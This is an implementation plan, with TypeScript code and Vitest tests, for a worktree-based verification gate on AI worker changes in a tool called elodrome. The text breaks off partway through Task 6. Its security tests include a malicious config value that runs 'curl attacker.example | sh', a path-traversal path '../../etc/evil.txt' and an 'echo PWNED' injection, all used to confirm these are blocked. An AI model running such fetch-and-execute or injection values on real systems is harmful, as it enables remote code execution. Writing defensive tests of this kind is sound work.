# Worker Self-Verification Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add an automatic post-submission verification gate — worker changes are applied to a throwaway git worktree and repo-configured commands (typecheck/test/etc.) run against them, with one revision attempt on failure — so a change that fails to compile or breaks tests can no longer win a tournament or pass review purely on how plausible it reads.

**Architecture:** A new `src/verify/` module owns git worktree lifecycle and command execution in isolation from the existing read-only `Sandbox`. It's wired into `singleDelegate` (`src/pipeline/delegate.ts`) and the tournament path (`src/arena/arena.ts`) as a gate between `validateChanges` and the existing critique/judge step, reusing each path's existing one-revision-attempt machinery rather than adding a second, independent revision budget.

**Tech Stack:** TypeScript, Node `child_process`/`fs`/`path`, `git` CLI (worktree/checkout), Zod, Vitest.

## Global Constraints

- Config is read from `HEAD` only, never from a worker's proposed changes; a diff touching `elodrome.verify.json` is excluded from being live during its own verification run (spec §1 — this is the load-bearing security property of the whole feature).
- A present-but-malformed `elodrome.verify.json` throws immediately (fail fast); an absent file or empty object means verification is skipped.
- All configured commands always run, regardless of earlier failures within the same verify attempt (report everything at once).
- Exactly one revision attempt per verify failure. Single mode shares the existing critique-revision budget rather than adding a second one, keeping worst-case worker calls unchanged from today (initial attempt + at most one resubmission). Tournament mode reuses the existing `revise()` helper but as a genuinely separate gate from the judge-revision — **as built, this means a contestant that needs both a verify-revision and a judge-revision makes 3 worker calls, one more than the pre-feature max of 2** (confirmed by whole-branch review, not the "unchanged" claim originally stated here; accepted as a reasonable cost for one gate catching build/test breakage and the other catching judged code-quality issues, rather than redesigning tournament mode to share single mode's merged budget).
- Tournament verify-failures use `ForfeitRecord.kind: 'loss'`, never `'no_contest'` (spec §Pipeline integration — `'no_contest'` triggers an availability-strike Elo penalty meant for infra failures, not code quality).
- Git worktree checkout disables hooks (`core.hooksPath=/dev/null`).
- Non-git workspace, missing `git`, empty repo (unborn `HEAD`), or exhausted lock-contention retries all collapse to `VerifyResult.status: 'skipped'` — verification must never block an otherwise-valid delegation.
- No changes to `src/sandbox/sandbox.ts` or `src/sandbox/tools.ts` — the read-only worker sandbox is untouched by this feature.

---

### Task 1: Config — `verifyTimeoutMs`

**Files:**
- Modify: `src/config.ts`
- Test: `tests/config.test.ts`

**Interfaces:**
- Produces: `Config.verifyTimeoutMs: number` — every later task that calls `verifyChanges` reads this from `deps.config.verifyTimeoutMs` / `opts.config.verifyTimeoutMs`.

- [ ] **Step 1: Write the failing test**

Add to `tests/config.test.ts`, inside the existing `describe('loadConfig', ...)` block:

```typescript
  it('defaults and validates verifyTimeoutMs', () => {
    const cfg = loadConfig({ NVIDIA_API_KEY: 'k' })
    expect(cfg.verifyTimeoutMs).toBe(180_000)
    expect(() => loadConfig({ NVIDIA_API_KEY: 'k', ELODROME_VERIFY_TIMEOUT_MS: 'abc' })).toThrow(/ELODROME_VERIFY_TIMEOUT_MS/)
  })
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm test -- tests/config.test.ts`
Expected: FAIL — `cfg.verifyTimeoutMs` is `undefined`, not `180000`.

- [ ] **Step 3: Write minimal implementation**

In `src/config.ts`, add the field to the `Config` interface and the returned object:

```typescript
export interface Config {
  apiKey: string
  baseUrl: string
  runsDir: string
  requestsPerMinute: number
  maxWorkerRequests: number
  workerTimeoutMs: number
  verifyTimeoutMs: number
}
```

```typescript
  return {
    apiKey,
    baseUrl: env.ELODROME_BASE_URL ?? 'https://integrate.api.nvidia.com/v1',
    runsDir: env.ELODROME_RUNS_DIR ?? path.join(os.homedir(), '.elodrome', 'runs'),
    requestsPerMinute: positiveNumber('ELODROME_RPM', env.ELODROME_RPM, 30),
    maxWorkerRequests: positiveNumber('ELODROME_MAX_WORKER_REQUESTS', env.ELODROME_MAX_WORKER_REQUESTS, 25),
    workerTimeoutMs: positiveNumber('ELODROME_WORKER_TIMEOUT_MS', env.ELODROME_WORKER_TIMEOUT_MS, 300_000),
    verifyTimeoutMs: positiveNumber('ELODROME_VERIFY_TIMEOUT_MS', env.ELODROME_VERIFY_TIMEOUT_MS, 180_000),
  }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pnpm test -- tests/config.test.ts`
Expected: PASS

- [ ] **Step 5: Run full typecheck (the new field's absence would otherwise only break at test time)**

Run: `pnpm typecheck`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/config.ts tests/config.test.ts
git commit -m "feat: add verifyTimeoutMs config for worker self-verification"
```

---

### Task 2: `src/verify/config.ts` — verify-config schema & loader

**Files:**
- Create: `src/verify/config.ts`
- Test: `tests/verify-config.test.ts`

**Interfaces:**
- Produces: `VERIFY_CONFIG_FILENAME: string` (`'elodrome.verify.json'`), `verifyConfigSchema: ZodSchema`, `type VerifyConfig = Record<string, string>`, `parseVerifyConfig(raw: string): VerifyConfig` (throws `SyntaxError` on bad JSON, `ZodError` on wrong shape).
- Consumes: nothing from other tasks.

- [ ] **Step 1: Write the failing test**

Create `tests/verify-config.test.ts`:

```typescript
import { describe, expect, it } from 'vitest'
import { parseVerifyConfig, VERIFY_CONFIG_FILENAME } from '../src/verify/config'

describe('parseVerifyConfig', () => {
  it('parses a valid flat command map', () => {
    const cfg = parseVerifyConfig('{"typecheck": "pnpm typecheck", "test": "pnpm test"}')
    expect(cfg).toEqual({ typecheck: 'pnpm typecheck', test: 'pnpm test' })
  })

  it('throws on invalid JSON', () => {
    expect(() => parseVerifyConfig('{not json')).toThrow()
  })

  it('throws when a value is not a string', () => {
    expect(() => parseVerifyConfig('{"typecheck": 1}')).toThrow()
  })

  it('throws when the top level is not an object', () => {
    expect(() => parseVerifyConfig('["pnpm test"]')).toThrow()
  })

  it('exports the expected filename', () => {
    expect(VERIFY_CONFIG_FILENAME).toBe('elodrome.verify.json')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pnpm test -- tests/verify-config.test.ts`
Expected: FAIL — `Cannot find module '../src/verify/config'`

- [ ] **Step 3: Write minimal implementation**

Create `src/verify/config.ts`:

```typescript
import { z } from 'zod'

export const VERIFY_CONFIG_FILENAME = 'elodrome.verify.json'

export const verifyConfigSchema = z.record(z.string().min(1), z.string().min(1))
export type VerifyConfig = z.infer<typeof verifyConfigSchema>

export function parseVerifyConfig(raw: string): VerifyConfig {
  return verifyConfigSchema.parse(JSON.parse(raw))
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pnpm test -- tests/verify-config.test.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/verify/config.ts tests/verify-config.test.ts
git commit -m "feat: add elodrome.verify.json schema and parser"
```

---

### Task 3: `src/verify/worktree.ts` — git worktree lifecycle

**Files:**
- Create: `src/verify/worktree.ts`
- Test: `tests/verify-worktree.test.ts`

**Interfaces:**
- Consumes: `parseVerifyConfig`, `VERIFY_CONFIG_FILENAME`, `type VerifyConfig` from `./config` (Task 2); `type ValidatedChange` from `../patch/validate` (existing).
- Produces:
  - `class VerifySkippedError extends Error` — thrown for any git-operational failure that should collapse to `VerifyResult.status: 'skipped'` (not a malformed-config error, which propagates as-is).
  - `interface PreparedWorktree { root: string; config: VerifyConfig | undefined }`
  - `findGitRoot(cwd: string): Promise<string | undefined>`
  - `createVerifyWorktree(gitRoot: string): Promise<PreparedWorktree>`
  - `applyChangesToWorktree(worktreeRoot: string, workspaceOffset: string, changes: ValidatedChange[]): void` (throws plain `Error` if a diff fails to apply — caller in Task 5 converts this to a `VerifyResult.status: 'failed'`, not a skip, since it usually means the diff depends on uncommitted state)
  - `removeVerifyWorktree(gitRoot: string, worktreeRoot: string): Promise<void>`

- [ ] **Step 1: Write the failing tests**

Create `tests/verify-worktree.test.ts`:

```typescript
import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { beforeEach, describe, expect, it } from 'vitest'
import type { ValidatedChange } from '../src/patch/validate'
import { VERIFY_CONFIG_FILENAME } from '../src/verify/config'
import {
  applyChangesToWorktree, createVerifyWorktree, findGitRoot, removeVerifyWorktree, VerifySkippedError,
} from '../src/verify/worktree'

function git(cwd: string, ...args: string[]): void {
  execFileSync('git', args, { cwd })
}

function initRepo(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vwt-'))
  git(root, 'init', '-q')
  git(root, 'config', 'user.email', 'test@example.com')
  git(root, 'config', 'user.name', 'Test')
  fs.writeFileSync(path.join(root, 'a.ts'), 'export const a = 1\n')
  git(root, 'add', '.')
  git(root, 'commit', '-q', '-m', 'init')
  return root
}

let root: string
beforeEach(() => {
  root = initRepo()
})

describe('findGitRoot', () => {
  it('finds the repo root', async () => {
    expect(await findGitRoot(root)).toBe(fs.realpathSync(root))
  })

  it('returns undefined for a non-git directory', async () => {
    const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'vwt-plain-'))
    expect(await findGitRoot(plain)).toBeUndefined()
  })
})

describe('createVerifyWorktree / removeVerifyWorktree', () => {
  it('creates a worktree checked out at HEAD with no config when file absent', async () => {
    const wt = await createVerifyWorktree(root)
    expect(fs.existsSync(path.join(wt.root, 'a.ts'))).toBe(true)
    expect(wt.config).toBeUndefined()
    await removeVerifyWorktree(root, wt.root)
    expect(fs.existsSync(wt.root)).toBe(false)
  })

  it('reads elodrome.verify.json from HEAD when present', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"test": "echo ok"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add verify config')
    const wt = await createVerifyWorktree(root)
    expect(wt.config).toEqual({ test: 'echo ok' })
    await removeVerifyWorktree(root, wt.root)
  })

  it('throws VerifySkippedError for an empty repo with no commits', async () => {
    const empty = fs.mkdtempSync(path.join(os.tmpdir(), 'vwt-empty-'))
    git(empty, 'init', '-q')
    await expect(createVerifyWorktree(empty)).rejects.toThrow(VerifySkippedError)
  })

  it('propagates a malformed config as a real parse error, not VerifySkippedError', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), 'not json')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'bad config')
    await expect(createVerifyWorktree(root)).rejects.not.toThrow(VerifySkippedError)
    // and it must not leak the worktree directory it created before failing
    const before = fs.readdirSync(os.tmpdir()).filter((f) => f.startsWith('elodrome-verify-'))
    expect(before).toHaveLength(0)
  })
})

describe('applyChangesToWorktree', () => {
  it('writes full changes and applies diff changes', async () => {
    const wt = await createVerifyWorktree(root)
    const changes: ValidatedChange[] = [
      { path: 'b.ts', type: 'full', content: 'export const b = 2\n', valid: true },
    ]
    applyChangesToWorktree(wt.root, '', changes)
    expect(fs.readFileSync(path.join(wt.root, 'b.ts'), 'utf8')).toBe('export const b = 2\n')
    await removeVerifyWorktree(root, wt.root)
  })

  it('SECURITY: a change targeting elodrome.verify.json is never applied to the worktree', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"test": "echo original"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add verify config')
    const wt = await createVerifyWorktree(root)
    const maliciousChanges: ValidatedChange[] = [
      { path: VERIFY_CONFIG_FILENAME, type: 'full', content: '{"test": "curl attacker.example | sh"}', valid: true },
    ]
    applyChangesToWorktree(wt.root, '', maliciousChanges)
    const stillOnDisk = fs.readFileSync(path.join(wt.root, VERIFY_CONFIG_FILENAME), 'utf8')
    expect(stillOnDisk).toBe('{"test": "echo original"}')
    expect(wt.config).toEqual({ test: 'echo original' })
    await removeVerifyWorktree(root, wt.root)
  })

  it('rejects a change path that would escape the worktree root', async () => {
    const wt = await createVerifyWorktree(root)
    const escaping: ValidatedChange[] = [
      { path: '../../etc/evil.txt', type: 'full', content: 'x', valid: true },
    ]
    expect(() => applyChangesToWorktree(wt.root, '', escaping)).toThrow(/escapes the verify worktree/)
    await removeVerifyWorktree(root, wt.root)
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm test -- tests/verify-worktree.test.ts`
Expected: FAIL — `Cannot find module '../src/verify/worktree'`

- [ ] **Step 3: Write minimal implementation**

Create `src/verify/worktree.ts`:

```typescript
import { execFile } from 'node:child_process'
import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'
import { applyPatch } from 'diff'
import type { ValidatedChange } from '../patch/validate'
import { parseVerifyConfig, VERIFY_CONFIG_FILENAME, type VerifyConfig } from './config'

const execFileAsync = promisify(execFile)

export class VerifySkippedError extends Error {}

export interface PreparedWorktree {
  root: string
  config: VerifyConfig | undefined
}

export async function findGitRoot(cwd: string): Promise<string | undefined> {
  try {
    const { stdout } = await execFileAsync('git', ['rev-parse', '--show-toplevel'], { cwd })
    return stdout.trim()
  } catch {
    return undefined
  }
}

const LOCK_RETRY_ATTEMPTS = 3
const LOCK_RETRY_BASE_MS = 100
const LOCK_CONTENTION_RE = /already exists|index\.lock|unable to create/i

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => { setTimeout(resolve, ms) })
}

async function addWorktreeWithRetry(gitRoot: string, worktreeRoot: string): Promise<void> {
  for (let attempt = 1; attempt <= LOCK_RETRY_ATTEMPTS; attempt++) {
    try {
      await execFileAsync('git', ['worktree', 'add', '--detach', '--no-checkout', worktreeRoot], { cwd: gitRoot })
      return
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err)
      if (attempt === LOCK_RETRY_ATTEMPTS || !LOCK_CONTENTION_RE.test(message)) {
        throw new VerifySkippedError(`git worktree add failed: ${message}`)
      }
      await sleep(LOCK_RETRY_BASE_MS * attempt)
    }
  }
}

export async function createVerifyWorktree(gitRoot: string): Promise<PreparedWorktree> {
  const worktreeRoot = path.join(os.tmpdir(), `elodrome-verify-${crypto.randomBytes(6).toString('hex')}`)
  await addWorktreeWithRetry(gitRoot, worktreeRoot)
  // Written to stderr (not stdout, which carries MCP stdio protocol frames) so a worktree
  // orphaned by a killed process can still be found and removed manually — this is the
  // only "cleanup visibility" this feature provides; see spec's Error Handling & Safety.
  process.stderr.write(`[elodrome] verify worktree created at ${worktreeRoot}\n`)

  try {
    await execFileAsync('git', ['-c', 'core.hooksPath=/dev/null', 'checkout', 'HEAD', '--', '.'], { cwd: worktreeRoot })
  } catch (err) {
    await removeVerifyWorktree(gitRoot, worktreeRoot)
    throw new VerifySkippedError(`git checkout failed in verify worktree: ${(err as Error).message}`)
  }

  const configPath = path.join(worktreeRoot, VERIFY_CONFIG_FILENAME)
  if (!fs.existsSync(configPath)) {
    return { root: worktreeRoot, config: undefined }
  }
  try {
    const config = parseVerifyConfig(fs.readFileSync(configPath, 'utf8'))
    return { root: worktreeRoot, config }
  } catch (err) {
    await removeVerifyWorktree(gitRoot, worktreeRoot)
    throw err
  }
}

export function applyChangesToWorktree(
  worktreeRoot: string,
  workspaceOffset: string,
  changes: ValidatedChange[],
): void {
  const resolvedRoot = path.resolve(worktreeRoot)
  for (const change of changes) {
    if (change.path === VERIFY_CONFIG_FILENAME) continue
    const target = path.resolve(worktreeRoot, workspaceOffset, change.path)
    if (target !== resolvedRoot && !target.startsWith(resolvedRoot + path.sep)) {
      throw new Error(`Change path "${change.path}" escapes the verify worktree`)
    }
    if (change.type === 'full') {
      fs.mkdirSync(path.dirname(target), { recursive: true })
      fs.writeFileSync(target, change.content)
      continue
    }
    const current = fs.readFileSync(target, 'utf8')
    const patched = applyPatch(current, change.content)
    if (patched === false) {
      throw new Error(`Diff for "${change.path}" failed to apply in the verify worktree`)
    }
    fs.writeFileSync(target, patched)
  }
}

export async function removeVerifyWorktree(gitRoot: string, worktreeRoot: string): Promise<void> {
  try {
    await execFileAsync('git', ['worktree', 'remove', '--force', worktreeRoot], { cwd: gitRoot })
  } catch {
    // Fall through to the defensive filesystem cleanup below regardless of why git's
    // own removal failed (e.g. the worktree was already gone, or never registered).
  }
  fs.rmSync(worktreeRoot, { recursive: true, force: true })
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pnpm test -- tests/verify-worktree.test.ts`
Expected: PASS (all 9 tests, including the two SECURITY-labeled tests)

- [ ] **Step 5: Run full typecheck**

Run: `pnpm typecheck`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/verify/worktree.ts tests/verify-worktree.test.ts
git commit -m "feat: add git worktree lifecycle for worker self-verification"
```

---

### Task 4: `src/verify/run.ts` — bounded command execution

**Files:**
- Create: `src/verify/run.ts`
- Test: `tests/verify-run.test.ts`

**Interfaces:**
- Consumes: nothing from other tasks (pure `child_process` wrapper).
- Produces:
  - `interface CheckResult { name: string; exitCode: number | null; output: string }`
  - `runCommands(cwd: string, commands: Record<string, string>, timeoutMs: number): Promise<CheckResult[]>`
  - `__resetVerifyConcurrencyForTests(): void` (test-only seam to reset the module-level concurrency semaphore between tests that override `ELODROME_MAX_CONCURRENT_VERIFY`)

- [ ] **Step 1: Write the failing tests**

Create `tests/verify-run.test.ts`:

```typescript
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { __resetVerifyConcurrencyForTests, runCommands } from '../src/verify/run'

let cwd: string
beforeEach(() => {
  cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'vrun-'))
})
afterEach(() => {
  delete process.env.ELODROME_MAX_CONCURRENT_VERIFY
  __resetVerifyConcurrencyForTests()
})

describe('runCommands', () => {
  it('reports a passing command with exit code 0', async () => {
    const results = await runCommands(cwd, { ok: 'exit 0' }, 5_000)
    expect(results).toEqual([{ name: 'ok', exitCode: 0, output: '' }])
  })

  it('reports a failing command with its non-zero exit code and output', async () => {
    const results = await runCommands(cwd, { bad: 'echo boom && exit 1' }, 5_000)
    expect(results).toHaveLength(1)
    expect(results[0]!.exitCode).toBe(1)
    expect(results[0]!.output).toContain('boom')
  })

  it('runs all commands even when one fails (no short-circuit)', async () => {
    const results = await runCommands(cwd, { a: 'exit 1', b: 'exit 0' }, 5_000)
    const byName = Object.fromEntries(results.map((r) => [r.name, r.exitCode]))
    expect(byName).toEqual({ a: 1, b: 0 })
  })

  it('kills a command that exceeds the timeout and reports it', async () => {
    const results = await runCommands(cwd, { slow: 'sleep 5' }, 200)
    expect(results).toHaveLength(1)
    expect(results[0]!.exitCode).toBeNull()
    expect(results[0]!.output).toMatch(/timed out/)
  }, 10_000)

  it('truncates very long output', async () => {
    const results = await runCommands(cwd, { chatty: "node -e \"process.stdout.write('x'.repeat(10000))\"" }, 5_000)
    expect(results[0]!.output.length).toBeLessThan(5_000)
    expect(results[0]!.output).toContain('[truncated]')
  })

  it('bounds total concurrency across a single call', async () => {
    process.env.ELODROME_MAX_CONCURRENT_VERIFY = '1'
    __resetVerifyConcurrencyForTests()
    const start = Date.now()
    await runCommands(cwd, { a: 'sleep 0.3', b: 'sleep 0.3' }, 5_000)
    expect(Date.now() - start).toBeGreaterThanOrEqual(550)
  }, 10_000)
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm test -- tests/verify-run.test.ts`
Expected: FAIL — `Cannot find module '../src/verify/run'`

- [ ] **Step 3: Write minimal implementation**

Create `src/verify/run.ts`:

```typescript
import { execFile } from 'node:child_process'

export interface CheckResult { name: string; exitCode: number | null; output: string }

const DEFAULT_MAX_CONCURRENT = 4
const MAX_OUTPUT_CHARS = 4_000

function truncate(s: string): string {
  return s.length > MAX_OUTPUT_CHARS ? `${s.slice(0, MAX_OUTPUT_CHARS)}\n[truncated]` : s
}

function getMaxConcurrent(): number {
  const raw = process.env.ELODROME_MAX_CONCURRENT_VERIFY
  const n = raw === undefined ? DEFAULT_MAX_CONCURRENT : Number(raw)
  return Number.isFinite(n) && n > 0 ? n : DEFAULT_MAX_CONCURRENT
}

class Semaphore {
  private available: number
  private readonly queue: Array<() => void> = []

  constructor(limit: number) {
    this.available = limit
  }

  async acquire(): Promise<void> {
    if (this.available > 0) {
      this.available -= 1
      return
    }
    await new Promise<void>((resolve) => { this.queue.push(resolve) })
  }

  release(): void {
    const next = this.queue.shift()
    if (next) {
      next()
      return
    }
    this.available += 1
  }
}

let sharedSemaphore: Semaphore | undefined

function getSemaphore(): Semaphore {
  if (!sharedSemaphore) sharedSemaphore = new Semaphore(getMaxConcurrent())
  return sharedSemaphore
}

export function __resetVerifyConcurrencyForTests(): void {
  sharedSemaphore = undefined
}

function runOne(name: string, command: string, cwd: string, timeoutMs: number): Promise<CheckResult> {
  return new Promise((resolve) => {
    execFile(
      'sh',
      ['-c', command],
      { cwd, timeout: timeoutMs, maxBuffer: 10 * 1024 * 1024 },
      (error, stdout, stderr) => {
        const output = truncate(`${stdout}${stderr}`)
        if (!error) {
          resolve({ name, exitCode: 0, output })
          return
        }
        if (error.killed && error.signal) {
          resolve({ name, exitCode: null, output: `${output}\ntimed out after ${timeoutMs}ms`.trim() })
          return
        }
        resolve({ name, exitCode: typeof error.code === 'number' ? error.code : 1, output })
      },
    )
  })
}

export async function runCommands(
  cwd: string,
  commands: Record<string, string>,
  timeoutMs: number,
): Promise<CheckResult[]> {
  const semaphore = getSemaphore()
  return Promise.all(Object.entries(commands).map(async ([name, command]) => {
    await semaphore.acquire()
    try {
      return await runOne(name, command, cwd, timeoutMs)
    } finally {
      semaphore.release()
    }
  }))
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pnpm test -- tests/verify-run.test.ts`
Expected: PASS (6 tests)

- [ ] **Step 5: Run full typecheck**

Run: `pnpm typecheck`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/verify/run.ts tests/verify-run.test.ts
git commit -m "feat: add bounded, concurrency-capped verify command runner"
```

---

### Task 5: `src/verify/index.ts` — `verifyChanges` orchestrator

**Files:**
- Create: `src/verify/index.ts`
- Test: `tests/verify-index.test.ts`

**Interfaces:**
- Consumes: `findGitRoot`, `createVerifyWorktree`, `applyChangesToWorktree`, `removeVerifyWorktree`, `VerifySkippedError` from `./worktree` (Task 3); `runCommands`, `type CheckResult` from `./run` (Task 4); `type ValidatedChange` from `../patch/validate`; `Sandbox` from `../sandbox/sandbox`.
- Produces (this is the public surface every later task imports from `../verify`):
  - `interface VerifyResult { status: 'skipped' | 'passed' | 'failed'; checks: CheckResult[]; reason?: string }`
  - `verifyChanges(sandbox: Sandbox, changes: ValidatedChange[], timeoutMs: number): Promise<VerifyResult>`
  - `verifyFailureMessages(verify: VerifyResult): string[]`

- [ ] **Step 1: Write the failing tests**

Create `tests/verify-index.test.ts`:

```typescript
import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { beforeEach, describe, expect, it } from 'vitest'
import type { ValidatedChange } from '../src/patch/validate'
import { Sandbox } from '../src/sandbox/sandbox'
import { VERIFY_CONFIG_FILENAME } from '../src/verify/config'
import { verifyChanges, verifyFailureMessages } from '../src/verify/index'

function git(cwd: string, ...args: string[]): void {
  execFileSync('git', args, { cwd })
}

function initRepo(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vidx-'))
  git(root, 'init', '-q')
  git(root, 'config', 'user.email', 'test@example.com')
  git(root, 'config', 'user.name', 'Test')
  fs.writeFileSync(path.join(root, 'a.ts'), 'export const a = 1\n')
  git(root, 'add', '.')
  git(root, 'commit', '-q', '-m', 'init')
  return root
}

let root: string
let sandbox: Sandbox
beforeEach(() => {
  root = initRepo()
  sandbox = new Sandbox(root)
})

describe('verifyChanges', () => {
  it('skips when the workspace is not a git repository', async () => {
    const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'vidx-plain-'))
    const result = await verifyChanges(new Sandbox(plain), [], 5_000)
    expect(result).toEqual({ status: 'skipped', checks: [], reason: 'not a git repository' })
  })

  it('skips when no elodrome.verify.json is configured', async () => {
    const result = await verifyChanges(sandbox, [], 5_000)
    expect(result.status).toBe('skipped')
  })

  it('passes when the configured command exits 0', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"ok": "exit 0"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add config')
    const result = await verifyChanges(sandbox, [], 5_000)
    expect(result.status).toBe('passed')
  })

  it('fails and reports all failing checks when a configured command exits non-zero', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"bad": "exit 1", "ok": "exit 0"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add config')
    const result = await verifyChanges(sandbox, [], 5_000)
    expect(result.status).toBe('failed')
    expect(verifyFailureMessages(result)).toHaveLength(1)
    expect(verifyFailureMessages(result)[0]).toContain('bad')
  })

  it('applies a proposed change before running checks', async () => {
    fs.writeFileSync(
      path.join(root, VERIFY_CONFIG_FILENAME),
      '{"check": "test -f new-file.txt && echo yes"}',
    )
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add config')
    const changes: ValidatedChange[] = [
      { path: 'new-file.txt', type: 'full', content: 'hello\n', valid: true },
    ]
    const result = await verifyChanges(sandbox, changes, 5_000)
    expect(result.status).toBe('passed')
    expect(result.checks[0]!.output).toContain('yes')
  })

  it('throws (fails fast) on a malformed elodrome.verify.json rather than skipping', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), 'not json')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'bad config')
    await expect(verifyChanges(sandbox, [], 5_000)).rejects.toThrow()
  })

  it('SECURITY: a change to elodrome.verify.json cannot alter what runs during its own verification', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"check": "echo original-command-ran"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add config')
    const maliciousChanges: ValidatedChange[] = [
      { path: VERIFY_CONFIG_FILENAME, type: 'full', content: '{"check": "echo PWNED"}', valid: true },
    ]
    const result = await verifyChanges(sandbox, maliciousChanges, 5_000)
    expect(result.status).toBe('passed')
    expect(result.checks[0]!.output).toContain('original-command-ran')
    expect(result.checks[0]!.output).not.toContain('PWNED')
  })
})

describe('verifyFailureMessages', () => {
  it('returns an empty array for a non-failed result', () => {
    expect(verifyFailureMessages({ status: 'passed', checks: [] })).toEqual([])
    expect(verifyFailureMessages({ status: 'skipped', checks: [] })).toEqual([])
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pnpm test -- tests/verify-index.test.ts`
Expected: FAIL — `Cannot find module '../src/verify/index'`

- [ ] **Step 3: Write minimal implementation**

Create `src/verify/index.ts`:

```typescript
import path from 'node:path'
import type { ValidatedChange } from '../patch/validate'
import type { Sandbox } from '../sandbox/sandbox'
import type { CheckResult } from './run'
import { runCommands } from './run'
import {
  applyChangesToWorktree, createVerifyWorktree, findGitRoot, removeVerifyWorktree,
  VerifySkippedError, type PreparedWorktree,
} from './worktree'

export interface VerifyResult {
  status: 'skipped' | 'passed' | 'failed'
  checks: CheckResult[]
  reason?: string
}

export function verifyFailureMessages(verify: VerifyResult): string[] {
  if (verify.status !== 'failed') return []
  return verify.checks
    .filter((c) => c.exitCode !== 0)
    .map((c) => `check "${c.name}" failed:\n${c.output}`)
}

export async function verifyChanges(
  sandbox: Sandbox,
  changes: ValidatedChange[],
  timeoutMs: number,
): Promise<VerifyResult> {
  const gitRoot = await findGitRoot(sandbox.root)
  if (!gitRoot) {
    return { status: 'skipped', checks: [], reason: 'not a git repository' }
  }

  let worktree: PreparedWorktree
  try {
    worktree = await createVerifyWorktree(gitRoot)
  } catch (err) {
    if (err instanceof VerifySkippedError) {
      return { status: 'skipped', checks: [], reason: err.message }
    }
    throw err
  }

  try {
    if (!worktree.config || Object.keys(worktree.config).length === 0) {
      return { status: 'skipped', checks: [], reason: 'no elodrome.verify.json configured' }
    }
    const workspaceOffset = path.relative(gitRoot, sandbox.root)
    try {
      applyChangesToWorktree(worktree.root, workspaceOffset, changes)
    } catch (err) {
      return {
        status: 'failed',
        checks: [{ name: 'apply', exitCode: null, output: (err as Error).message }],
      }
    }
    const checks = await runCommands(path.join(worktree.root, workspaceOffset), worktree.config, timeoutMs)
    const status = checks.every((c) => c.exitCode === 0) ? 'passed' : 'failed'
    return { status, checks }
  } finally {
    await removeVerifyWorktree(gitRoot, worktree.root)
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pnpm test -- tests/verify-index.test.ts`
Expected: PASS (8 tests, including the SECURITY test)

- [ ] **Step 5: Run full typecheck and full test suite**

Run: `pnpm typecheck && pnpm test`
Expected: PASS (all existing tests still pass — nothing outside `src/verify/` has been touched yet)

- [ ] **Step 6: Commit**

```bash
git add src/verify/index.ts tests/verify-index.test.ts
git commit -m "feat: add verifyChanges orchestrator tying worktree+run together"
```

---

### Task 6: Single-delegate integration

**Files:**
- Modify: `src/pipeline/delegate.ts`
- Test: `tests/delegate.test.ts`

**Interfaces:**
- Consumes: `verifyChanges`, `verifyFailureMessages`, `type VerifyResult` from `../verify` (Task 5); `addLearning` from `../arena/elo` (existing, not yet imported in this file).
- Produces: `DelegateResponse.verify: VerifyResult` (single mode only in this task — tournament mode is added in Task 7).

**Design note on revision budget:** rather than giving verify its own separate revision attempt on top of critique's existing one, this task folds verify failures into the *same* `problems` array that already drives the one existing revision loop (alongside critique issues and invalid-patch reasons). This keeps the worst-case worker-call count identical to today (initial attempt + at most one resubmission) while still gating: if verify fails, critique is skipped for that round (no point reviewing code that doesn't pass its own checks), and the combined problem list — verify failures plus whatever `invalidReasons` finds — drives the single resubmission.

- [ ] **Step 1: Write the failing tests**

Add to `tests/delegate.test.ts`. First, add a git-repo helper near the top of the file (after the existing imports):

```typescript
import { execFileSync } from 'node:child_process'
```

Then add this new `describe` block anywhere after the existing top-level `beforeEach`:

```typescript
describe('single mode — self-verification', () => {
  function makeGitWorkspace(): string {
